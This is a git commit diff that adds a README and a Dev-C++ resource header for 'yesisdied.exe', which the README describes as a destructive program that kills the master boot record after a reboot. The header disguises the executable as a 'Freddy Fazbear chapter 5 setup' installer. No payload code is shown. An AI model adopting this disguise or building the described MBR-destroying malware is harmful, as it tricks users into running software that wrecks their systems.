d3b7877f1de7ac2be39dddd1d9ec98acc6a4eef8
Drmies <141207441+Hugopako@users.noreply.github.com>
2024-04-26 12:46:25 +0700

    Source Code

---
+++ yesisdied source/PLS README.txt
@@ -0,0 +1,4 @@
+(!) yesisdied.exe by Hugopako (!)
+hessfire has no skid so shut up N17Pro3426
+if you reboot, Then MBR is Died!
+Damage rate / Type: Destructive
---
+++ yesisdied source/yesisdied_private.h
@@ -0,0 +1,23 @@
+/* THIS FILE WILL BE OVERWRITTEN BY DEV-C++ */
+/* DO NOT EDIT ! */
+
+#ifndef YESISDIED_PRIVATE_H
+#define YESISDIED_PRIVATE_H
+
+/* VERSION DEFINITIONS */
+#define VER_STRING	"6.6.6.6"
+#define VER_MAJOR	6
+#define VER_MINOR	6
+#define VER_RELEASE	6
+#define VER_BUILD	6
+#define COMPANY_NAME	"Hugopako"
+#define FILE_VERSION	"6.6.6.6"
+#define FILE_DESCRIPTION	"Freddy Fazbear chapter 5 setup"
+#define INTERNAL_NAME	"yesisdied.exe"
+#define LEGAL_COPYRIGHT	"666"
+#define LEGAL_TRADEMARKS	"666"
+#define ORIGINAL_FILENAME	"yesisdied.exe"
+#define PRODUCT_NAME	"666"
+#define PRODUCT_VERSION	"6.6.6.6"
+
+#endif /*YESISDIED_PRIVATE_H*/
